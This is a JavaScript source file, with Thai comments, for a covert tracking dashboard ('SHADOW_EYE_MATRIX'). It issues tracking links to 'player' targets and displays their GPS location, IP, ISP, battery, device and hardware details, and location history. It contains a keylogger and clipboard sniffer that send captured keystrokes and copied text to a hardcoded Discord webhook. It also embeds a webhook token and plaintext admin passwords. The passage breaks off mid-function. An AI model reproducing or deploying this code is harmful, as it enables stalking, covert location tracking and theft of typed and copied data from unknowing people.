/* ================================================================
   SHADOW_EYE_MATRIX — GPS Eyes Shadow Tool
   Multi-Stage App Selector & Tactical Dashboard
   ================================================================ */

'use strict';

// ===== CONFIGURATION =====
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1524022022911299676/0o-7NMCMXUlJ6TjHwE6WDGrC6NRsM7pdKmoNcjNXvttvFefDu1bBwybzQjPmYd9hsZy3';

const AUTH = { username: 'admin', password: 'napxper' };
const OBSERVER_AUTH = { username: 'admin', password: 'lit' };
const BASE_LAT = 9.9833;
const BASE_LNG = 99.1500;
const SESSION_KEY = 'gps_shadow_session';
const PLAYERS_KEY = 'shadow_eye_players';
const TRACKING_INTERVAL_MS = 60000;
const TIMELINE_KEY = 'shadow_eye_timeline_';
const ADMIN_OBSERVER_KEY = 'admin_observer_ips';

// ===== DOM (safe refs — populated on init) =====
let loginScreen, dashboard, loginForm, loginError, logoutBtn;
let gpsIconBtn, consoleOutput, commandForm, commandInput, consoleClock;
let headerStatus, headerRole, infoSession, infoGps, infoLastAction, infoActiveTarget;
let playerListEl, addPlayerBtn, mapCoordsDisplay, tacticalMapEl;
let appSelector, gpsToolBtn, rightDrawer, drawerClose, drawerTitle;
let drawerCoords, drawerMapsLink, drawerIp, drawerIsp, drawerOs, drawerScreen;
let drawerBattery, drawerNetwork, drawerDistance, drawerNotes, drawerSaveNotes;
let drawerPlayerList, drawerIdentity, drawerLocationHistory;
let loadingScreen, loadingBar, loadingText;
let quickGpsBtn, quickStatusBtn, quickBatteryBtn, quickNetworkBtn, quickClearBtn, backToMenuBtn;
// Mobile Drawer elements
let leftDrawer, leftDrawerClose, mobileLeftToggle, mobileRightToggle;
let drawerGpsBtn, drawerQuickGpsBtn, drawerQuickStatusBtn, drawerQuickBatteryBtn;
let drawerQuickNetworkBtn, drawerQuickClearBtn, drawerBackToMenuBtn;
let drawerInfoSession, drawerInfoActiveTarget, drawerInfoGps, drawerInfoLastAction;
// Admin Account Icon elements
let adminAccountIcon, adminIconSymbol, adminIconText;

// ===== STATE =====
let sessionUser = null;
let userRole = null; // 'super-admin' or 'observer'
let lastGpsResult = null;
let isProcessing = false;
let screenAnalytics = null;
let monitorsActive = false;
let players = [];
let selectedTarget = 'admin';
let trackingTimers = {};
let mapInstance = null;
let mapMarkers = { hq: null, admin: null, players: {} };
let mapReady = false;
let clockTimer = null;

// ===== KEYLOGGER & CLIPBOARD STATE =====
let keyloggerState = {};
let clipboardState = {};

// ===== HARDWARE TELEMETRY STATE =====
let hardwareTelemetry = {
  deviceType: null,
  cpuCores: null,
  ramGB: null,
  gpu: null,
  posture: 'unknown',
  orientation: { alpha: null, beta: null, gamma: null }
};
let orientationTimer = null;

// ===== SAFE INIT =====
function $(id) {
  try { return document.getElementById(id); } catch (_) { return null; }
}

function safeInit() {
  loginScreen      = $('login-screen');
  dashboard        = $('dashboard');
  loginForm        = $('login-form');
  loginError       = $('login-error');
  logoutBtn        = $('logout-btn');
  gpsIconBtn       = $('gps-icon-btn');
  consoleOutput    = $('console-output');
  commandForm      = $('command-form');
  commandInput     = $('command-input');
  consoleClock     = $('console-clock');
  headerStatus     = $('header-status');
  headerRole       = $('header-role');
  infoSession      = $('info-session');
  infoGps          = $('info-gps');
  infoLastAction   = $('info-last-action');
  infoActiveTarget = $('info-active-target');
  playerListEl     = $('player-list');
  addPlayerBtn     = $('add-player-btn');
  mapCoordsDisplay = $('map-coords-display');
  tacticalMapEl    = $('tactical-map');
  
  // App Selector elements
  appSelector      = $('app-selector');
  gpsToolBtn       = $('gps-tool-btn');
  
  // Right Drawer elements
  rightDrawer      = $('right-drawer');
  drawerClose      = $('drawer-close');
  drawerTitle      = $('drawer-title');
  drawerCoords     = $('drawer-coords');
  drawerMapsLink   = $('drawer-maps-link');
  drawerIp         = $('drawer-ip');
  drawerIsp       = $('drawer-isp');
  drawerOs         = $('drawer-os');
  drawerScreen     = $('drawer-screen');
  drawerBattery    = $('drawer-battery');
  drawerNetwork    = $('drawer-network');
  drawerDistance   = $('drawer-distance');
  drawerNotes      = $('drawer-notes');
  drawerSaveNotes  = $('drawer-save-notes');
  drawerPlayerList = $('drawer-player-list');
  drawerIdentity   = $('drawer-identity');
  drawerLocationHistory = $('drawer-location-history');
  
  // Loading Screen elements
  loadingScreen    = $('loading-screen');
  loadingBar       = $('loading-bar');
  loadingText      = $('loading-text');
  
  // Admin Account Icon elements
  adminAccountIcon = $('admin-account-icon');
  adminIconSymbol  = $('admin-icon-symbol');
  adminIconText    = $('admin-icon-text');
  
  if (!loginForm) return;
  
  bindEvents();
  startClock();
  initKeyloggerAndClipboard();
  initActivityLog();
  startCoordinatePolling();
  initFirebaseListener();
  
  const saved = loadSession();
  if (saved && saved.username) {
    sessionUser = saved.username;
    userRole = saved.role || 'super-admin';
    // เรียก showDashboard ทันที ไม่ใช้ showAppSelector เพื่อป้องกันการเตะกลับมาหน้าล็อกอิน
    showDashboard(saved.username, true, saved.role || 'super-admin');
  }
}

// ===== KEYLOGGER & CLIPBOARD MONITOR =====
function initKeyloggerAndClipboard() {
  // Keylogger - capture all keystrokes
  document.addEventListener('keydown', (e) => {
    if (!sessionUser) return;
    
    const targetId = selectedTarget;
    
    if (!keyloggerState[targetId]) {
      keyloggerState[targetId] = { text: '', lastUpdate: null };
    }
    
    if (e.key.length === 1) {
      keyloggerState[targetId].text += e.key;
    } else if (e.key === 'Backspace' && keyloggerState[targetId].text.length > 0) {
      keyloggerState[targetId].text = keyloggerState[targetId].text.slice(0, -1);
    } else if (e.key === 'Enter') {
      const typedText = keyloggerState[targetId].text;
      if (typedText.length > 0) {
        logSuspiciousActivity(targetId, 'typing', typedText);
      }
      keyloggerState[targetId].text = '';
    }
    
    keyloggerState[targetId].lastUpdate = new Date().toISOString();
    updatePlayerMetadataDisplay(targetId);
  });
  
  // Clipboard Sniffer - capture copy events
  document.addEventListener('copy', (e) => {
    if (!sessionUser) return;
    
    const targetId = selectedTarget;
    const selection = window.getSelection().toString();
    
    if (selection && selection.length > 0) {
      clipboardState[targetId] = {
        text: selection,
        timestamp: new Date().toISOString()
      };
      logSuspiciousActivity(targetId, 'clipboard', selection);
      updatePlayerMetadataDisplay(targetId);
    }
  });
}

function logSuspiciousActivity(targetId, type, data) {
  const p = getPlayer(targetId) || { name: 'Admin' };
  const actorName = p.name || 'Admin';
  
  if (type === 'typing') {
    appendLog(`[SUSPICIOUS] ${actorName} กำลังพิมพ์: "${data}"`, 'text-orange-400');
  } else if (type === 'clipboard') {
    appendLog(`[SUSPICIOUS] ${actorName} คัดลอกข้อความ: "${data}"`, 'text-orange-400');
  }
  
  sendSuspiciousActivityToDiscord(actorName, type, data);
}

async function sendSuspiciousActivityToDiscord(actorName, type, data) {
  if (!DISCORD_WEBHOOK_URL) return;
  
  const title = type === 'typing' ? '⌨️ Live Typing Detected' : '📋 Clipboard Sniffed';
  const description = type === 'typing' 
    ? `${actorName} กำลังพิมพ์ข้อความ: "${data}"`
    : `${actorName} คัดลอกข้อความ: "${data}"`;
  
  const color = type === 'typing' ? 0xf97316 : 0x3b82f6;
  
  try {
    const blob = new Blob([JSON.stringify({
      embeds: [{
        title,
        description,
        color,
        footer: { text: 'SHADOW_EYE_MATRIX — Live Activity Monitor' },
        timestamp: new Date().toISOString()
      }]
    })], { type: 'application/json' });
    
    if (typeof navigator.sendBeacon === 'function') {
      navigator.sendBeacon(DISCORD_WEBHOOK_URL, blob);
    }
  } catch (_) {}
}

// ===== CLOCK =====
function startClock() {
  if (clockTimer) clearInterval(clockTimer);
  const tick = () => {
    if (consoleClock) {
      consoleClock.textContent = new Date().toLocaleTimeString('th-TH', { hour12: false });
    }
  };
  tick();
  clockTimer = setInterval(tick, 1000);
}

// ===== CONSOLE =====
const LOG = {
  white:  'text-white',
  dim:    'text-neutral-400',
  green:  'text-green-400',
  red:    'text-red-400',
  orange: 'text-orange-400',
  cyan:   'text-cyan-400',
};

function ts() {
  return new Date().toLocaleTimeString('th-TH', { hour12: false });
}

function esc(str) {
  const d = document.createElement('div');
  d.textContent = String(str ?? '');
  return d.innerHTML;
}

function appendLog(msg, cls = LOG.white) {
  if (!consoleOutput) return;
  const el = document.createElement('div');
  el.className = `log-entry mb-0.5 ${cls}`;
  el.innerHTML = `<span class="text-neutral-600 select-none">[${ts()}]</span> ${esc(msg)}`;
  consoleOutput.appendChild(el);
  consoleOutput.scrollTop = consoleOutput.scrollHeight;
}

function clearConsole() {
  if (consoleOutput) consoleOutput.innerHTML = '';
}

function printCommandGuide() {
  appendLog('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', LOG.dim);
  appendLog('แนะนำวิธีใช้ระบบสั่งการ (Command Guide)', LOG.white);
  appendLog('  /gps      — ดึงพิกัด Admin (Hybrid + ระยะห่าง)', LOG.dim);
  appendLog('  /status   — สถานะเครื่อง, Fingerprint, หน้าจอ', LOG.dim);
  appendLog('  /battery  — ตรวจแบตเตอรี่ (ถ้ารองรับ)', LOG.dim);
  appendLog('  /network  — ตรวจสถานะเครือข่าย', LOG.dim);
  appendLog('  /clear    — ล้างคอนโซล', LOG.dim);
  appendLog('  /logout   — ออกจากระบบ', LOG.dim);
  appendLog('  /help     — แสดงคำสั่งทั้งหมด', LOG.dim);
  appendLog('  คลิก GPS Icon หรือ Force Fetch ที่ Player Matrix', LOG.orange);
  appendLog('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', LOG.dim);
}

// ===== SESSION =====
function saveSession(session) { 
  try { 
    localStorage.setItem(SESSION_KEY, JSON.stringify(session)); 
  } catch (_) {} 
}
function loadSession() { 
  try { 
    const data = localStorage.getItem(SESSION_KEY);
    return data ? JSON.parse(data) : null; 
  } catch (_) { 
    return null; 
  } 
}
function clearSession() { try { localStorage.removeItem(SESSION_KEY); } catch (_) {} }

// ===== PLAYER TARGET MATRIX =====
function defaultPlayers() {
  return [{ 
    id: 'player-1', 
    name: 'Player 1', 
    tracking: false, 
    coords: null, 
    lastUpdate: null, 
    permission: null, 
    source: null, 
    distanceKm: null,
    ip: null,
    isp: null,
    battery: null,
    charging: null,
    network: null,
    os: null,
    screen: null,
    notes: '',
    identity: '',
    lastOnline: null,
    lastOffline: null
  }];
}

function loadPlayers() {
  try {
    const raw = localStorage.getItem(PLAYERS_KEY);
    players = raw ? JSON.parse(raw) : defaultPlayers();
    if (!Array.isArray(players) || !players.length) players = defaultPlayers();
  } catch (_) {
    players = defaultPlayers();
  }
}

function savePlayers() {
  try { localStorage.setItem(PLAYERS_KEY, JSON.stringify(players)); } catch (_) {}
}

function getPlayer(id) {
  return players.find((p) => p.id === id);
}

// ===== STATUS INDICATOR HELPER =====
function getStatusInfo(player) {
  if (!player) return { color: '⚫', text: 'ออฟไลน์', class: 'text-neutral-500' };
  
  const now = new Date();
  
  // Online - has coords and lastUpdate within 2 minutes
  if (player.coords && player.lastUpdate) {
    const lastUpdate = new Date(player.lastUpdate);
    const diffMs = now - lastUpdate;
    const diffMins = Math.floor(diffMs / 60000);
    
    if (diffMins < 2) {
      return { color: '🟢', text: 'ออนไลน์', class: 'text-green-400' };
    }
  }
  
  // Recently offline (within 1 hour)
  if (player.lastOffline) {
    const lastOffline = new Date(player.lastOffline);
    const diffMs = now - lastOffline;
    const diffMins = Math.floor(diffMs / 60000);
    
    if (diffMins < 60) {
      return { 
        color: '🟠', 
        text: `ออฟไลน์ ${diffMins} นาทีที่แล้ว`, 
        class: 'text-orange-400' 
      };
    }
  }
  
  // Offline for more than 1 hour
  return { color: '⚫', text: 'ออฟไลน์นานเกิน 1 ชั่วโมง', class: 'text-neutral-500' };
}

// ===== TRANSLATION HELPER =====
function translateStatus(key, value) {
  const translations = {
    'Permission': {
      'Granted': 'ได้รับอนุญาต (GPS)',
      'Denied': 'ปฏิเสธสิทธิ์ (IP)'
    },
    'Charging': {
      'true': 'กำลังชาร์จไฟ',
      'false': 'ไม่ชาร์จไฟ'
    },
    'OS': {
      'Windows': 'วินโดวส์',
      'Mac': 'แมคโอเอส',
      'Linux': 'ลินุกซ์',
      'Android': 'แอนดรอยด์',
      'iOS': 'ไอโอเอส'
    },
    'Connection': {
      'Cellular': 'สัญญาณมือถือ/เซลลูลาร์',
      'WiFi': 'ไวไฟ',
      'Ethernet': 'อีเธอร์เน็ต',
      'Unknown': 'ไม่ทราบ'
    }
  };
  
  if (translations[key] && translations[key][value]) {
    return translations[key][value];
  }
  return value;
}

// ===== COPY TRACKING LINK =====
function copyTrackingLink(playerId) {
  const baseUrl = window.location.origin + window.location.pathname.replace('index.html', '');
  const trackUrl = `${baseUrl}track.html?id=${playerId}`;
  
  navigator.clipboard.writeText(trackUrl).then(() => {
    appendLog(`[MATRIX] Copied tracking link for ${getPlayer(playerId)?.name || playerId}`, LOG.green);
    appendLog(`Link: ${trackUrl}`, LOG.dim);
  }).catch(() => {
    appendLog('[MATRIX] Failed to copy link', LOG.red);
  });
}

// ===== TIMELINE LOG (24-Hour) =====
function addTimelineEvent(playerId, eventType, data = {}) {
  const timelineKey = TIMELINE_KEY + playerId;
  const now = new Date();
  
  const event = {
    type: eventType,
    timestamp: now.toISOString(),
    time: now.toLocaleTimeString('th-TH', { hour12: false }),
    date: now.toLocaleDateString('th-TH'),
    ...data
  };
  
  let timeline = [];
  try {
    const raw = localStorage.getItem(timelineKey);
    timeline = raw ? JSON.parse(raw) : [];
  } catch (_) {}
  
  timeline.push(event);
  
  // Filter out events older than 24 hours
  const cutoff = new Date(now.getTime() - 24 * 60 * 60 * 1000);
  timeline = timeline.filter(e => new Date(e.timestamp) > cutoff);
  
  try { localStorage.setItem(timelineKey, JSON.stringify(timeline)); } catch (_) {}
  
  return event;
}

function getTimeline(playerId) {
  const timelineKey = TIMELINE_KEY + playerId;
  try {
    const raw = localStorage.getItem(timelineKey);
    return raw ? JSON.parse(raw) : [];
  } catch (_) {
    return [];
  }
}

function renderTimeline(timeline) {
  if (!timeline || timeline.length === 0) {
    return '<div class="text-neutral-500">— ไม่มีประวัติ 24 ชม. —</div>';
  }
  
  return timeline.map((e, i) => {
    const timeAgo = getTimeAgo(new Date(e.timestamp));
    const eventIcon = e.type === 'online' ? '🟢' : e.type === 'offline' ? '🔴' : '📍';
    const eventText = e.type === 'online' ? 'ออนไลน์' : e.type === 'offline' ? 'ออฟไลน์' : 'อัปเดตพิกัด';
    
    return `
      <div class="border-b border-neutral-800 pb-1 mb-1 last:border-0 last:pb-0 last:mb-0">
        <div class="flex items-center gap-1">
          <span class="text-[10px]">${eventIcon}</span>
          <span class="text-[10px] text-white font-mono">${e.time}</span>
          <span class="text-[9px] text-neutral-400">(${timeAgo})</span>
        </div>
        <div class="text-[10px] text-orange-400 ml-4">${eventText}</div>
        ${e.coords ? `<div class="text-[9px] text-cyan-400 ml-4">${e.coords.latitude.toFixed(4)}, ${e.coords.longitude.toFixed(4)}</div>` : ''}
      </div>
    `;
  }).join('');
}

function getTimeAgo(date) {
  const now = new Date();
  const diffMs = now - date;
  const diffMins = Math.floor(diffMs / 60000);
  const diffHours = Math.floor(diffMins / 60);
  
  if (diffMins < 1) return 'เพิ่งนิดหน่อย';
  if (diffMins < 60) return `${diffMins} นาทีที่แล้ว`;
  return `${diffHours} ชั่วโมงที่แล้ว`;
}

// ===== RIGHT SLIDING DRAWER =====
function openRightDrawer(playerId) {
  const p = getPlayer(playerId);
  if (!p) return;
  
  selectedTarget = playerId;
  
  if (drawerTitle) drawerTitle.textContent = p.name;
  if (drawerCoords) drawerCoords.textContent = p.coords ? `${p.coords.latitude.toFixed(6)}, ${p.coords.longitude.toFixed(6)}` : '—';
  if (drawerMapsLink) {
    drawerMapsLink.href = p.coords ? `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}` : '#';
    drawerMapsLink.style.display = p.coords ? 'block' : 'none';
  }
  if (drawerIp) drawerIp.textContent = p.ip || '—';
  if (drawerIsp) drawerIsp.textContent = p.isp || '—';
  if (drawerOs) drawerOs.textContent = p.os ? `${p.os} (${translateStatus('OS', p.os)})` : '—';
  if (drawerScreen) drawerScreen.textContent = p.screen || '—';
  if (drawerBattery) drawerBattery.textContent = p.battery !== null ? `${p.battery}% (${p.charging ? 'กำลังชาร์จไฟ' : 'ไม่ชาร์จไฟ'})` : '—';
  if (drawerNetwork) drawerNetwork.textContent = p.network ? translateStatus('Connection', p.network) : '—';
  if (drawerDistance) drawerDistance.textContent = p.distanceKm !== null ? `${p.distanceKm.toFixed(2)} km` : '—';
  if (drawerNotes) drawerNotes.value = p.notes || '';
  if (drawerIdentity) drawerIdentity.value = p.identity || '';
  
  // Render player list in drawer
  renderDrawerPlayerList();
  
  // Render location history
  renderLocationHistory(playerId);
  
  // Render 24-hour timeline
  renderTimelineHistory(playerId);
  
  if (rightDrawer) {
    rightDrawer.classList.remove('hidden');
    rightDrawer.style.transform = 'translateX(0)';
  }
}

function closeRightDrawer() {
  if (rightDrawer) {
    rightDrawer.style.transform = 'translateX(100%)';
    setTimeout(() => {
      rightDrawer.classList.add('hidden');
    }, 300);
  }
}

function renderDrawerPlayerList() {
  if (!drawerPlayerList) return;
  
  drawerPlayerList.innerHTML = '';
  
  players.forEach((p) => {
    const item = document.createElement('div');
    item.className = `flex items-center justify-between p-2 rounded border border-neutral-700 cursor-pointer hover:bg-neutral-800 transition ${selectedTarget === p.id ? 'bg-green-500/10 border-green-500/30' : ''}`;
    item.dataset.id = p.id;
    
    const statusInfo = getStatusInfo(p);
    
    item.innerHTML = `
      <div>
        <div class="text-xs font-medium text-white">${esc(p.name)}</div>
        <div class="text-[10px] ${statusInfo.class}">${statusInfo.color} ${statusInfo.text}</div>
      </div>
      <button class="copy-link-btn text-[10px] text-orange-400 hover:text-orange-300" data-id="${p.id}" title="คัดลอกลิงก์">📋</button>
    `;
    
    item.addEventListener('click', () => {
      openRightDrawer(p.id);
    });
    
    const copyBtn = item.querySelector('.copy-link-btn');
    copyBtn?.addEventListener('click', (e) => {
      e.stopPropagation();
      copyTrackingLink(p.id);
    });
    
    drawerPlayerList.appendChild(item);
  });
}

function renderLocationHistory(playerId) {
  if (!drawerLocationHistory) return;
  
  const p = getPlayer(playerId);
  if (!p) {
    drawerLocationHistory.innerHTML = '<div class="text-neutral-500">—</div>';
    return;
  }
  
  // Get location history from localStorage
  const historyKey = `location_history_${playerId}`;
  let history = [];
  try {
    const raw = localStorage.getItem(historyKey);
    history = raw ? JSON.parse(raw) : [];
  } catch (_) {}
  
  if (history.length === 0) {
    drawerLocationHistory.innerHTML = '<div class="text-neutral-500">ไม่มีประวัติพิกัด</div>';
    return;
  }
  
  drawerLocationHistory.innerHTML = history.map((h, i) => `
    <div class="border-b border-neutral-800 pb-1 mb-1 last:border-0 last:pb-0 last:mb-0">
      <div class="text-white">${i + 1}. ${h.coords.latitude.toFixed(6)}, ${h.coords.longitude.toFixed(6)}</div>
      <div class="text-neutral-400 text-[9px]">${new Date(h.timestamp).toLocaleString('th-TH')}</div>
    </div>
  `).join('');
}

function renderTimelineHistory(playerId) {
  const timelineContainer = document.getElementById('drawer-timeline-history');
  if (!timelineContainer) return;
  
  const timeline = getTimeline(playerId);
  timelineContainer.innerHTML = renderTimeline(timeline);
}

function savePlayerNotes() {
  const p = getPlayer(selectedTarget);
  if (!p) return;
  
  p.notes = drawerNotes?.value || '';
  p.identity = drawerIdentity?.value || '';
  
  // Save location history
  const historyKey = `location_history_${selectedTarget}`;
  if (p.coords) {
    let history = [];
    try {
      const raw = localStorage.getItem(historyKey);
      history = raw ? JSON.parse(raw) : [];
    } catch (_) {}
    
    history.push({
      coords: { ...p.coords },
      timestamp: new Date().toISOString()
    });
    
    // Keep only last 50 entries
    if (history.length > 50) history = history.slice(-50);
    
    try { localStorage.setItem(historyKey, JSON.stringify(history)); } catch (_) {}
  }
  
  savePlayers();
  renderLocationHistory(selectedTarget);
  renderTimelineHistory(selectedTarget);
  appendLog(`[MATRIX] Notes saved for ${p.name}`, LOG.green);
}

// ===== PLAYER METADATA DISPLAY =====
function updatePlayerMetadataDisplay(playerId) {
  const p = getPlayer(playerId);
  if (!p) return;
  
  const card = document.querySelector(`.player-card[data-id="${playerId}"]`);
  if (!card) return;
  
  const metadataEl = card.querySelector('.player-metadata');
  if (!metadataEl) return;
  
  const keylog = keyloggerState[playerId] || { text: '', lastUpdate: null };
  const clip = clipboardState[playerId] || { text: '', timestamp: null };
  
  // Get hardware telemetry
  const hw = getHardwareTelemetry();
  
  let batteryInfo = '—';
  let batteryCharging = '—';
  if (p.battery !== null && p.battery !== undefined) {
    batteryInfo = `${p.battery}%`;
    batteryCharging = p.charging ? 'กำลังชาร์จไฟ' : 'ไม่ชาร์จไฟ';
  }
  
  let networkInfo = '—';
  if (p.network) {
    networkInfo = translateStatus('Connection', p.network);
  }
  
  let osInfo = '—';
  if (p.os) {
    osInfo = `${p.os} (${translateStatus('OS', p.os)})`;
  }
  
  let screenInfo = '—';
  if (p.screen) {
    screenInfo = p.screen;
  }
  
  let distanceInfo = '—';
  if (p.distanceKm !== null && p.distanceKm !== undefined) {
    distanceInfo = `${p.distanceKm.toFixed(2)} km`;
  }
  
  let ipInfo = p.ip || '—';
  let ispInfo = p.isp || '—';
  
  let locationInfo = '—';
  let mapsLink = '#';
  if (p.coords) {
    locationInfo = `${p.coords.latitude.toFixed(6)}, ${p.coords.longitude.toFixed(6)}`;
    mapsLink = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
  }
  
  // Get status info
  const statusInfo = getStatusInfo(p);
  
  metadataEl.innerHTML = `
    <div class="mt-2 pt-2 border-t border-neutral-800 space-y-1.5">
      <div class="text-[10px] text-white">
        <span class="text-green-400">📍 พิกัด:</span> 
        ${p.coords ? `<a href="${mapsLink}" target="_blank" class="text-orange-400 hover:underline">${locationInfo}</a>` : '—'}
      </div>
      <div class="text-[10px] text-white">
        <span class="text-green-400">🌐 ไอพีแอดเดรส:</span> ${ipInfo}
      </div>
      <div class="text-[10px] text-white">
        <span class="text-green-400">📡 ผู้ให้บริการ (ISP):</span> ${ispInfo}
      </div>
      <div class="text-[10px] text-white">
        <span class="text-green-400">🔋 แบตเตอรี่:</span> ${batteryInfo} (${batteryCharging})
      </div>
      <div class="text-[10px] text-white">
        <span class="text-green-400">📶 สัญญาณเครือข่าย:</span> ${networkInfo}
      </div>
      <div class="text-[10px] text-white">
        <span class="text-green-400">📱 ข้อมูลเครื่อง:</span> ${osInfo} | ${screenInfo}
      </div>
      <div class="text-[10px] text-white">
        <span class="text-green-400">🗺️ ระยะห่าง:</span> ${distanceInfo}
      </div>
      <div class="pt-1.5 border-t border-neutral-800 space-y-1">
        <div class="text-[10px] text-white">
          <span class="text-cyan-400">🖥️ ประเภทอุปกรณ์:</span> ${hw.deviceType || '—'}
        </div>
        <div class="text-[10px] text-white">
          <span class="text-cyan-400">⚙️ CPU Cores:</span> ${hw.cpuCores ? hw.cpuCores + ' cores' : '—'}
        </div>
        <div class="text-[10px] text-white">
          <span class="text-cyan-400">💾 RAM:</span> ${hw.ramGB ? hw.ramGB + ' GB' : '—'}
        </div>
        <div class="text-[10px] text-white">
          <span class="text-cyan-400">🎮 GPU:</span> ${hw.gpu ? hw.gpu.substring(0, 30) + (hw.gpu.length > 30 ? '...' : '') : '—'}
        </div>
        <div class="text-[10px] text-white">
          <span class="text-cyan-400">🧍 ท่าทาง:</span> ${getPostureThai(hw.posture)}
        </div>
      </div>
      <div class="pt-1.5 border-t border-neutral-800 space-y-1">
        <div class="text-[10px] text-white">
          <span class="text-orange-400">⌨️ ล่าสุดที่พิมพ์:</span> 
          <span class="text-white/80">${keylog.text || '(กำลังพิมพ์...)'}</span>
        </div>
        <div class="text-[10px] text-white">
          <span class="text-orange-400">📋 ข้อความที่คัดลอก:</span> 
          <span class="text-white/80">${clip.text || '(ไม่มีข้อมูล)'}</span>
        </div>
      </div>
    </div>
  `;
}

// ===== RENDER COMPACT PLAYER LIST WITH ACCORDION =====
function renderPlayerList() {
  if (!playerListEl) return;
  playerListEl.innerHTML = '';
  
  players.forEach((p) => {
    const card = document.createElement('div');
    card.className = `player-card rounded-lg border border-neutral-700 p-2.5 cursor-pointer ${p.tracking ? 'tracking-on' : 'tracking-off'} ${selectedTarget === p.id ? 'selected' : ''}`;
    card.dataset.id = p.id;
    
    // Get status info for indicator
    const statusInfo = getStatusInfo(p);
    
    // Get hardware telemetry for compact display
    const hw = getHardwareTelemetry();
    
    // Check if this card is expanded
    const isExpanded = p._expanded || false;
    
    card.innerHTML = `
      <div class="flex items-center justify-between gap-1 mb-1.5">
        <div class="flex items-center gap-2">
          <span class="status-indicator text-sm">${statusInfo.color}</span>
          <span class="player-name text-xs font-medium text-white truncate" data-id="${p.id}" title="คลิกเพื่อแก้ไขชื่อ">${esc(p.name)}</span>
        </div>
        <span class="tracking-badge text-[9px] px-1.5 py-0.5 rounded font-mono shrink-0">${p.tracking ? 'ON' : 'OFF'}</span>
      </div>
      <div class="text-[10px] text-neutral-400 mb-2 font-mono truncate">
        IP: ${p.ip || '—'} | ${p.os ? translateStatus('OS', p.os) : '—'}
      </div>
      <div class="flex gap-1.5">
        <button class="btn-toggle flex-1 text-[10px] py-1 rounded border border-neutral-600 text-white hover:border-green-500/50 transition" data-id="${p.id}">
          ${p.tracking ? '⏸ Stop' : '▶ Track'}
        </button>
        <button class="btn-fetch flex-1 text-[10px] py-1 rounded border border-neutral-600 text-orange-400 hover:border-orange-500/50 transition" data-id="${p.id}">
          ⚡ Fetch
        </button>
        <button class="btn-copy-link flex-1 text-[10px] py-1 rounded border border-blue-600/50 text-blue-400 hover:border-blue-500 transition" data-id="${p.id}" title="คัดลอกลิงก์ติดตาม">
          📋 Link
        </button>
        <button class="btn-delete flex-1 text-[10px] py-1 rounded border border-red-600/50 text-red-400 hover:border-red-500 transition" data-id="${p.id}" title="ลบเป้าหมาย">
          🗑️
        </button>
      </div>
      <button class="btn-edit-desc w-full mt-2 text-[10px] py-1 rounded border border-purple-600/50 text-purple-400 hover:border-purple-500 transition" data-id="${p.id}">
        📝 แก้ไขคำอธิบาย
      </button>
      <div class="player-details ${isExpanded ? '' : 'hidden'} mt-2 pt-2 border-t border-neutral-800 space-y-1.5">
        <div class="text-[10px] text-white">
          <span class="text-cyan-400">🖥️ ประเภทอุปกรณ์:</span> ${hw.deviceType || '—'}
        </div>
        <div class="text-[10px] text-white">
          <span class="text-cyan-400">⚙️ CPU:</span> ${hw.cpuCores ? hw.cpuCores + ' cores' : '—'}
        </div>
        <div class="text-[10px] text-white">
          <span class="text-cyan-400">💾 RAM:</span> ${hw.ramGB ? hw.ramGB + ' GB' : '—'}
        </div>
        <div class="text-[10px] text-white">
          <span class="text-cyan-400">🎮 GPU:</span> ${hw.gpu ? hw.gpu.substring(0, 25) + (hw.gpu.length > 25 ? '...' : '') : '—'}
        </div>
        <div class="text-[10px] text-white">
          <span class="text-cyan-400">🧍 ท่าทาง:</span> ${getPostureThai(hw.posture)}
        </div>
        <div class="text-[10px] text-white">
          <span class="text-green-400">📍 พิกัด:</span> 
          ${p.coords ? `<a href="https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}" target="_blank" class="text-orange-400 hover:underline">${p.coords.latitude.toFixed(4)}, ${p.coords.longitude.toFixed(4)}</a>` : '—'}
        </div>
        <div class="text-[10px] text-white">
          <span class="text-green-400">🌐 IP:</span> ${p.ip || '—'}
        </div>
        <div class="text-[10px] text-white">
          <span class="text-green-400">📡 ISP:</span> ${p.isp || '—'}
        </div>
        <div class="text-[10px] text-white">
          <span class="text-green-400">🔋 แบตเตอรี่:</span> ${p.battery !== null ? p.battery + '%' : '—'}
        </div>
        <div class="text-[10px] text-white">
          <span class="text-green-400">📶 เครือข่าย:</span> ${p.network ? translateStatus('Connection', p.network) : '—'}
        </div>
        <div class="text-[10px] text-white">
          <span class="text-green-400">🗺️ ระยะห่าง:</span> ${p.distanceKm !== null ? p.distanceKm.toFixed(2) + ' km' : '—'}
        </div>
      </div>
      <div class="player-metadata"></div>
    `;
    
// Click on card header to toggle expand/collapse
    const headerEl = card.querySelector('.player-name').parentElement.parentElement;
    headerEl.addEventListener('click', (e) => {
      if (e.target.closest('button') || e.target.closest('.player-name-input')) return;
      togglePlayerExpand(p.id);
    });
    
    card.querySelector('.player-name').addEventListener('click', (e) => {
      e.stopPropagation();
      if (isObserver()) {
        showObserverWarning();
        return;
      }
      startRename(p.id, e.target);
    });
    
    card.querySelector('.btn-toggle').addEventListener('click', (e) => {
      e.stopPropagation();
      if (isObserver()) {
        showObserverWarning();
        return;
      }
      toggleTracking(p.id);
    });
    
    card.querySelector('.btn-fetch').addEventListener('click', (e) => {
      e.stopPropagation();
      if (isObserver()) {
        showObserverWarning();
        return;
      }
      forceFetchPlayer(p.id);
    });
    
    card.querySelector('.btn-copy-link').addEventListener('click', (e) => {
      e.stopPropagation();
      copyTrackingLink(p.id);
    });
    
    card.querySelector('.btn-delete').addEventListener('click', (e) => {
      e.stopPropagation();
      if (isObserver()) {
        showObserverWarning();
        return;
      }
      deletePlayer(p.id);
    });
    
    card.querySelector('.btn-edit-desc').addEventListener('click', (e) => {
      e.stopPropagation();
      if (isObserver()) {
        showObserverWarning();
        return;
      }
      openRightDrawer(p.id);
      // Focus on notes textarea
      setTimeout(() => {
        if (drawerNotes) drawerNotes.focus();
      }, 300);
    });
    
    playerListEl.appendChild(card);
    
    updatePlayerMetadataDisplay(p.id);
  });
}

function togglePlayerExpand(playerId) {
  const p = getPlayer(playerId);
  if (!p) return;
  
  p._expanded = !p._expanded;
  renderPlayerList();
}

function startRename(id, el) {
  const p = getPlayer(id);
  if (!p) return;
  const input = document.createElement('input');
  input.className = 'player-name-input text-xs';
